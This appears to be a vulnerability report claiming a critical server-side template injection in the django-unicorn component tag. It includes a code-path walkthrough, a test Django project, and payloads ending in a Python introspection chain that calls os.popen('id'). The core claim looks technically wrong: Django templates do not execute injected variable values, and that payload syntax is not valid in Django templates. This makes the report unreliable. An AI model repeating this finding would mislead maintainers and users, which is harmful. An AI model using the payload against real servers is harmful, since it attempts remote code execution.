- Vulnerability Name: Server-Side Template Injection via Component Arguments
- Description:
    1. An attacker can inject template code into component arguments passed via the `{% unicorn %}` template tag in Django templates.
    2. When the Django template engine renders the component's template, it processes the component arguments which may contain the injected template code.
    3. If the component's template directly renders these arguments without proper sanitization or escaping, the injected template code will be executed on the server.
    4. This can lead to arbitrary code execution on the server, information disclosure, or other malicious activities.
- Impact: Critical. An attacker can achieve Remote Code Execution (RCE) on the server.
- Vulnerability Rank: Critical
- Currently implemented mitigations: None. The project does not currently mitigate template injection in component arguments. Based on the analyzed files, no mitigations have been implemented.
- Missing mitigations:
    - Sanitize or escape component arguments within the component's template before rendering them, especially if they originate from user-controlled input or template context variables.
    - Implement a secure mechanism to pass data to components that inherently prevents template injection, such as using a restricted template context or pre-processing arguments.
    - Input validation on component arguments at the component level to ensure they are safe for template rendering.
- Preconditions:
    - The application must be using django-unicorn.
    - The application must allow user-controlled input to be passed, directly or indirectly through template context variables, as arguments to unicorn components in Django templates using the `{% unicorn %}` tag.
    - The component's template must render these arguments without proper escaping or sanitization.
- Source code analysis:
    1. **File: ..\django-unicorn\templatetags\unicorn.py:** The `unicorn` template tag is defined in this file.
    2. **File: ..\django-unicorn\templatetags\unicorn.py:** Inside the `unicorn` tag's `render` method, arguments passed to the tag are resolved using `template.Variable(value).resolve(context)`. This means any variable accessible in the Django template context can be passed as a component argument.
    3. **File: ..\django-unicorn\templatetags\unicorn.py:** The resolved arguments are passed to `UnicornView.create()` as `kwargs`.
    4. **File: ..\django-unicorn\components\unicorn_view.py:** In `UnicornView.create()` and subsequently in `construct_component()`, these `kwargs` are stored as `component_kwargs` in the `UnicornView` instance.
    5. **File: ..\django-unicorn\components\unicorn_view.py:** The `UnicornView.get_context_data()` method prepares the context for rendering the component's template. While it adds component attributes and methods to the context, it does not sanitize `component_kwargs`.
    6. **File: ..\django-unicorn\components\unicorn_template_response.py:**  `UnicornTemplateResponse.render()` uses the Django template engine to render the component's template. If the component's template directly uses and renders `component_kwargs` values without escaping, it will be vulnerable to SSTI.
    7. **Visualization:**

    ```
    Django Template --------> {% unicorn 'comp' arg=user_input %} --------> unicorn tag (templatetags/unicorn.py)
        |                                                                     |
        | Template Context (user_input)                                       | resolve args (template.Variable)
        |                                                                     |
        ----------------------------------------------------------------------> UnicornView.create (components/unicorn_view.py)
                                                                                |
                                                                                | component_kwargs stored
                                                                                |
                                                                                V UnicornView.render()
                                                                                    |
                                                                                    | get_context_data()
                                                                                    |
                                                                                    V UnicornTemplateResponse.render() (components/unicorn_template_response.py)
                                                                                        |
                                                                                        | Django Template Engine renders component template
                                                                                        |  **VULNERABILITY**: If component template renders component_kwargs UNSAFELY, SSTI occurs
                                                                                        V
                                                                                        HTML Response
    ```

- Security Test Case:
    1. Create a Django project with django-unicorn installed and configured as per the documentation.
    2. Define a component named `injection_test` with a simple view and template.
    3. **File: myapp/components/injection_test.py:**
        ```python
        from django_unicorn.components import UnicornView

        class InjectionTestView(UnicornView):
            arg_value = ""

            def mount(self):
                self.arg_value = self.component_kwargs.get("user_input", "")
        ```
    4. **File: myapp/templates/unicorn/injection_test.html:**
        ```html
        <div>
            <p>Value from argument: {{ arg_value }}</p>
        </div>
        ```
    5. Create a Django template that includes the `injection_test` component and passes a user-controlled template context variable as a component argument.
    6. **File: myapp/templates/index.html:**
        ```html
        {% load unicorn %}
        <html>
        <head>
            {% unicorn_scripts %}
        </head>
        <body>
            {% csrf_token %}
            {% unicorn 'injection-test' user_input=injected_value %}
        </body>
        </html>
        ```
    7. Create a Django view to render `index.html` and control the `injected_value` in the context.
    8. **File: myapp/views.py:**
        ```python
        from django.shortcuts import render

        def index(request):
            injected_value = request.GET.get("input", "Default Value")
            context = {"injected_value": injected_value}
            return render(request, "index.html", context)
        ```
    9. Run the Django development server.
    10. Access the application in a browser with a crafted URL to inject template code into the `input` GET parameter.
    11. Example URL: `http://127.0.0.1:8000/?input={{request.environ.PATH_INFO}}`
    12. Observe the output in the rendered page. If the `PATH_INFO` (or any other server-side information) is rendered instead of the raw template code `{{request.environ.PATH_INFO}}`, it confirms Server-Side Template Injection. A successful injection means the template code was executed on the server, revealing server-side information in this case.
    13. To test for more severe injection (Remote Code Execution), try more dangerous payloads. For instance `{{ ''.__class__.__mro__[2].__subclasses__()[406]('__builtins__').__import__('os').popen('id').read() }}` (This payload is just an example, might need adjustments based on the Django environment and Python version). If successful, this would demonstrate Remote Code Execution. Note that RCE payloads can be complex and environment-dependent, and may require adjustments to work.
